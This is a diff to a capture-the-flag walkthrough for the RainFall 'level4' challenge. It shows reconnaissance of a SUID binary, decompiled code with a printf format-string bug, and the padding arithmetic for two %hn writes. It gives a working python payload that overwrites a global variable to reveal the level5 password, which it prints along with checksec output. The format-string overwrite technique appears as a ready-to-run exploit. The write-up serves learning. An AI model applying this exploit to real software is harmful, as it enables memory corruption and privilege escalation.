@@ -1,3 +1,26 @@
+We get in the level4, then we list the files in the home directory:
+
+```
+    level4@RainFall:~$ ls -la
+    -rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
+```
+The binary is owned by level5 and has the SUID bit set, meaning if it executes any shell, it will run with level5's privileges.
+
+We try to execute the binary file to get an idea of what it does exactly
+
+```
+    level4@RainFall:~$ ./level4 
+    sdasdas
+    sdasdas
+    level4@RainFall:~$ ./level4 
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    level4@RainFall:~$ 
+
+```
+
+We decompile the binary to get the source code:
+
 ```
     int m = 0;
 
@@ -30,7 +53,7 @@
     }
 ```
 
-We have a global variable m is initialized to 0 if m == 16930116, the  check_and_run() function print the flag.
+We have a global variable m WHICH is initialized to 0, if m == 16930116, the  check_and_run() function print the flag.
 
 and we have printf(input); a format string vulnerability to overwrite the global variable m with 16930116
 
@@ -88,9 +111,23 @@ first_padding = 21828 - 8 = 21820
 
 second_padding = (258 - 21828) % 65536 = 43966 (Want to write 21828 first (0x5544), then 258 (0x0102) — which is smaller, so wrap around using modulo 65536 (0xFFFF) because %hn writes a 2-byte (16-bit) integer (0 -> 65535))
 
-```
-    level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/h
-    level4@RainFall:~$ (cat /tmp/h; cat) | ./level4
+reverse proof
 
+43966 + 21828 = 65794
+65794 - 65536 = 258
+
+```
+    level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/level4.exploit
+    level4@RainFall:~$ (cat /tmp/level4.exploit; cat) | ./level4
     0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+We jump to next level
+
+```
+level4@RainFall:~$ su level5
+Password:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
+level5@RainFall:~$ 
 ```
